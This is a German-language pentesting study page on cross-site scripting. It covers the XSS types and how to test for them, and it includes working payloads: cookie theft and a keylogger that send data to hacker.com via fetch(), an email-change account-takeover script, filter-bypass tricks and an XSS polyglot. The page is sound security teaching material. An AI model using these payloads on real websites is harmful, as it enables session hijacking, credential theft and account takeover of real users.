---
description: execute javascript in victim browsers
---

# XSS (cross-site scripting) — when user input becomes executable code

**DOM-based XSS:**\
JavaScript wird direkt im Browser über die HTML/DOM-Struktur ausgeführt, z. B. durch manipulierte `<script>`-Tags.

**Persistent XSS:**\
Schädlicher Code wird serverseitig gespeichert (z. B. in Blog-Kommentaren) und beim Laden der Seite an alle Nutzer ausgeliefert.

**Reflected XSS:**\
Schädlicher Code wird über die URL oder Formulareingaben eingeschleust und sofort clientseitig ausgeführt, z. B. bei unsicheren Suchfeldern.

## Payloads

Payloads werden in zwei Einzelteile zerlegt

1. Intention : Was soll der JavaScript ermöglichen?
2. Modifikation : Wie muss der originale Code an das gewünschte Szenario angepasst werden?

### \[1] Intention : Proof-of-Concept

Zur Demonstration der Möglichkeit von XSS reicht eine alert-box mit Text wie :&#x20;

```
<script>alert(document.domain);</script>
```

### \[2] Intention : Session Stealing

Diebstahl aller Cookies einer Zielmaschine.

{% code overflow="wrap" %}
```
<script>
    fetch(
        'https://hacker.com/steal?cookie=' + btoa(document.cookie)
    );
</script>
```
{% endcode %}

Der Code lädt alle Cookies des aktuellen Browsers mit _document.cookie_, kodiert die Daten mit base64 (btoa) und überträgt sie per Anfrage an die Seite _hacker.com/steal_ als Parameter _cookie_.

### \[3] Intention : Keylogger

Übertragung der Tastenanschläge eines Nutzers einer Zielmaschine

{% code overflow="wrap" %}
```
<script>
    document.onkeypress = function(e) {
        fetch(
            'https://hacker.com/log?key=' + btoa(e.key)
        );
    }
</script>
```
{% endcode %}

Dem Dokument wird der onkeypress - Listener angefügt. Dieser triggert bei Tastaturanschlag und führt eine anonyme Funktion aus. Der Key wird aus dem Event e ausgelesen und base64-kodiert als Anfrage an hacker.com/log mit Parameter key gesendet.

### \[4] Intention : Business Logic

Ausnutzen spezifischer Funktionen.

Beispielsweise könnte eine Seite die Funktion user.changeEmail( ) enthalten.

```
<script>user.changeEmail('attacker@hacker.com');</script>
```

Durch den Payload könnte die Email-Adresse des Accounts geändert werden und zum Reset des Passworts verwendet werden. (Reset Password Attack)

## Reflected XSS

Dies tritt auf, wenn vom Nutzer bereitgestellte Daten in der Website eingebunden werden ohne vorher überprüft/ validiert zu werden.

### Impact

Der Angreifer könnte Links senden oder sie in einen Iframe auf einer anderen Website einbetten, der eine JavaScript-Nutzlast enthält, um potenzielle Opfer dazu zu bringen, Code in ihrem Browser auszuführen, wodurch sie möglicherweise Sitzungs- oder Kundendaten preisgeben.

### Test auf Reflected XSS

Prüfung auf jeden möglichen Eintrittspunkt wie :&#x20;

* Parameter im URL-Query-String
* URL Datei-Pfad
* Manchmal HTTP-Header (obwohl es unwahrscheinlich ist, dass dies in der Praxis ausgenutzt werden kann)

## Stored XSS

Der XSS-Payload wird in der Web-Anwendung hinterlegt (z.b. Datenbank) und ausgeführt wenn andere Benutzer die Seite besuchen.

### Impact

Der Payload könnte Benutzer auf eine andere Website umleiten, die Sitzungs-Cookies des Benutzers stehlen oder andere Website-Aktionen durchführen, während es sich als der besuchende Benutzer ausgibt.

### Test auf Stored XSS

Es müssen alle möglichen Einstiegspunkte getestet werden, an denen Daten gespeichert und dann in Bereichen angezeigt werden, auf die andere Benutzer Zugriff haben.

* Kommentare in einem Blog
* Benutzerprofil-Informationen
* Website-Auflistungen

### Tipp

Wenn Inputs auf der Client-Side beschränkt werden (z.B. Limit der Eingabezeichen oder Beschränkung auf Integer), kann manuelles Übermitteln (curl) mit nicht erwarteten Eingabewerten Wunder bewirken!

## DOM Based XSS

DOM-basiertes XSS bedeutet, dass die JavaScript-Ausführung direkt im Browser erfolgt, ohne dass neue Seiten geladen oder Daten an den Backend-Code übermittelt werden. Die Ausführung erfolgt, wenn der JavaScript-Code der Website auf Eingaben oder Benutzerinteraktionen reagiert.

<figure><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5efe36fb68daf465530ca761/room-content/24a54ac532b5820bf0ffdddf00ab2247.png" alt=""><figcaption><p>HTML Document Object Model</p></figcaption></figure>

### Impact

Es könnten manipulierte Links an potenzielle Opfer gesendet werden, die sie auf eine andere Website umleiten oder Inhalte von der Seite oder der Sitzung des Benutzers stehlen.

### Test auf DOM Based XSS

DOM-basiertes XSS kann schwierig zu testen sein und erfordert ein gewisses Maß an Kenntnissen über JavaScript, um den Quellcode zu lesen. Man muss nach Teilen des Codes suchen, die auf bestimmte Variablen zugreifen, über die ein Angreifer die Kontrolle haben kann, wie z. B. "window.location.x"-Parameter.

Wenn diese Codeteile gefunden wurden, muss ihre Behandlung geprüft werden und ob die Werte jemals in das DOM der Webseite geschrieben oder an unsichere JavaScript-Methoden wie eval() übergeben werden.

```
<iframe src="javascript:alert(`xss`)"> 
```

## Blind XSS

Ähnlich wie Stored XSS. Payload wird auf der Seite gespeichert und kann von anderen Nutzern aufgerufen werden. Allerdings kann der Angreifer nicht prüfen ob er funktioniert

### Impact

Mit dem richtigen Payload könnte das JavaScript des Angreifers Callbacks zur Website des Angreifers tätigen und die URL des Mitarbeiterportals, die Cookies des Mitarbeiters und sogar den Inhalt der angezeigten Portalseite preisgeben. Nun könnte der Angreifer möglicherweise die Sitzung des Mitarbeiters entführen und Zugang zum privaten Portal erhalten.

### Test auf Blind XSS

* Payload mit Callback (HTTP Request).
* Ein bekanntes Tool für diese Attack ist XSS Hunter Express ([https://github.com/mandatoryprogrammer/xsshunter-express](https://github.com/mandatoryprogrammer/xsshunter-express)).

## Weitere Tipps

* Wenn \<script>.. innerhalb eines input-Elements erscheint, dann muss zuerst escaped werden mit bspw. `"><script>exploit</script>`
* Wenn input in \<script> auftaucht wie bspw. `document.getElementsByClassName('name')[0].innerHTML='d33d';` dann kann XSS eingefügt werden durch `document.getElementsByClassName('name')[0].innerHTML='d33d';alert('XSS-Vulnerability');//';`
* Wenn ein Filter bestimmte Strings wie bspw. string aus \<string> entfernt, kann folgendes probiert werden : \<s**script**cript>. Nach Entfernen des inneren "script" bleibt ein zweites übrig und kann ggfalls ohne weitere Prüfungs ausgeführt werden.
* Wenn möglich kann auch über einfügen von bspw. `onload="alert('XSS');` ausgenutzt werden.

## XSS Polyglot

Eine Textfolge, die Attribute und Tags umgehen kann und gleichzeitig Filter umgeht.\


{% code overflow="wrap" %}
```
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('P0ly') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert('P0ly')//>\x3e
```
{% endcode %}
